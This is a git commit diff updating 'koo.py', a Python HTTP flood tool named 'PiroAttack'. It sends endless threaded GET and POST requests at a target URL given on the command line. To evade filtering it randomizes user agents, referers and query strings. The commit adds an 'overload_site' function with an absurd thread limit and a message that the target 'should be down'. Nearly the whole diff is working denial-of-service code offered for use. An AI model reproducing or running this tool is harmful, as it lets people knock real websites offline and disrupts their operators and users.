3c17bd78139a9aabd63987bdb1688aeaabb28bbe
PIRODEVELEPOR <82955298+hk4crprasad@users.noreply.github.com>
2023-11-29 21:00:18 +0530

    Update koo.py

--- koo.py
+++ koo.py
@@ -1,15 +1,13 @@
 import random
 import string
 import threading
-import time
 import requests
 import argparse
-import os
-import signal
 from rich.console import Console
 from rich.traceback import install
 
 install()
+
 
 class PiroAttack:
     def __init__(self):
@@ -28,23 +26,19 @@ class PiroAttack:
             "Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)",
             "Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51"
         ]
-        
         self.headers_referers = [
             "http://www.google.com/?q=",
             "http://www.usatoday.com/search/results?q=",
-            "http://engadget.search.aol.com/search?q=",    
+            "http://engadget.search.aol.com/search?q=",
         ]
-        
         self.accept_charset = "ISO-8859-1,utf-8;q=0.7,*;q=0.7"
-        
-        self.cur_threads = 0
-        self.max_threads = 1023
-        
+        self.max_threads = 250000000000
         self.console = Console()
+        self.cur_threads = 0
         
     def generate_random_params(self):
-        return "".join(random.choice(string.ascii_letters) for _ in range(random.randint(3, 10)))
-    
+        return "".join(random.choices(string.ascii_letters, k=random.randint(3, 10)))
+
     def generate_random_headers(self):
         return {
             "User-Agent": random.choice(self.user_agents),
@@ -52,48 +46,43 @@ class PiroAttack:
             "Accept-Charset": self.accept_charset,
             "Referer": random.choice(self.headers_referers) + self.generate_random_params(),
             "Keep-Alive": str(random.randint(100, 500)),
-            "Connection": "keep-alive" 
+            "Connection": "keep-alive"
         }
-    
-    def make_request(self, url, data, custom_headers):        
-        headers = self.generate_random_headers()
-        headers.update(custom_headers)
-        
-        try:
-            if data:
-                requests.post(url, data=data, headers=headers)
-            else:
-                requests.get(url + "?" + self.generate_random_params(), headers=headers)
-            
-        except (requests.exceptions.RequestException, requests.exceptions.Timeout):
+
+    def make_request(self, url, data, custom_headers):
+        headers = {**self.generate_random_headers(),**custom_headers}
+        try:  
+            requests.post(url,data=data,headers=headers)if data else requests.get(url+"?"+self.generate_random_params(),headers=headers)
+            self.cur_threads += 1
+        except:  
             self.cur_threads -= 1
             self.console.print("[red]Error: Connection Timeout[/red]")
-            
         else:
-            self.cur_threads += 1
-            self.console.print(f"[cyan]Requests Sent: {self.cur_threads}[/cyan]", style="bold", end="\r")
+            self.console.print(f"[cyan]Requests Sent: {self.cur_threads}[/cyan]",style="bold",end="\r")
 
-    def attack(self, url, data, custom_headers):
+
+    def overload_site(self, url):
         try:
-            self.console.print("[bold blue]-- Piro Attack Started --[/bold blue]")
-            
+            self.console.print(f"[bold blue]Starting Overload Attack on {url} with {self.max_threads} threads[/]")
             while True:
-                thread = threading.Thread(target=self.make_request, args=(url, data, custom_headers))
+                thread = threading.Thread(target=self.make_request, args=(url, None, {}))
                 thread.start()
-                    
-        except KeyboardInterrupt:
-            self.console.print("[red]-- Interrupted by user --[/red]")
+                if self.cur_threads > self.max_threads:
+                    break
+            self.console.print("[green bold]Attack finished. Target site should be down.[/]")
+
+        except Exception as e:
+            self.console.print(f"[red bold]Error in attack: {e}[/red bold]")
+
 
 if __name__ == "__main__":
     parser = argparse.ArgumentParser(description="PIRO Attack")
     parser.add_argument("url", help="Target URL")
     parser.add_argument("-d", "--data", help="Data to POST")
     parser.add_argument("-H", "--headers", help="Custom headers")
-    
     args = parser.parse_args()
-    
     attack = PiroAttack()
     try:
-        attack.attack(args.url, args.data, dict(h.split(":") for h in args.headers.split(",")) if args.headers else {})
+        attack.overload_site(args.url)
     except KeyboardInterrupt:
         attack.console.print("[red]-- Interrupted by user --[/red]")
